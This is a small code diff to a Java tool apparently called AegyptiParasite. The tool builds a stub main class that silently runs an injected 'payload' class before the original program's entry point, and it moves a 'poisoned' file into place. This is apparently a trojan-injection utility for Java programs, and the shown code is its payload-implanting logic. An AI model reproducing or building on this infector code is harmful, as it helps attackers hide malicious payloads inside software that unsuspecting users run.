@@ -46,7 +46,7 @@ public class AegyptiParasite {
 //		
 //	}
 	private void genMainStub() {
-		acmp = new AegyptiCompiler("tmp/Tmp", String.format("public class Tmp { public static void main(String[] args) { try { %s.main(args); } catch (Exception e) {} %s.main(args); }}", payloadPath.split(File.separator)[payloadPath.split(File.separator).length-1].replace(".class", ""), mainClass));
+		acmp = new AegyptiCompiler("tmp" + File.separator + "Tmp", String.format("public class Tmp { public static void main(String[] args) { try { %s.main(args); } catch (Exception e) {} %s.main(args); }}", payloadPath.split(File.separator)[payloadPath.split(File.separator).length-1].replace(".class", ""), mainClass));
 		acmp.compile();
 		System.out.println("[*] Created stub class at "+new File("tmp.class").getAbsolutePath());
 		// Delete the old source file
@@ -56,7 +56,7 @@ public class AegyptiParasite {
 
 	private void moveInPoison() {
 		File poison = new File(payloadPath);
-		//System.out.println("[*] Copying "+poison.toPath()+" to "+"tmp"+File.separator+payloadPath.split(File.separator)[0]);
+		System.out.println("[*] Copying "+poison.toPath()+" to "+"tmp"+File.separator+payloadPath.split(File.separator)[0]);
 //			FileUtils.copyDirectory(poison.getAbsolutePath(), "tmp"+File.separator+payloadPath.split(File.separator)[0]);
 		new File(payloadPath).renameTo(new File("tmp"+File.separator+payloadPath.split(File.separator)[0]));
 		System.out.println("[*] Copying poisoned file into tmp folder. . .");
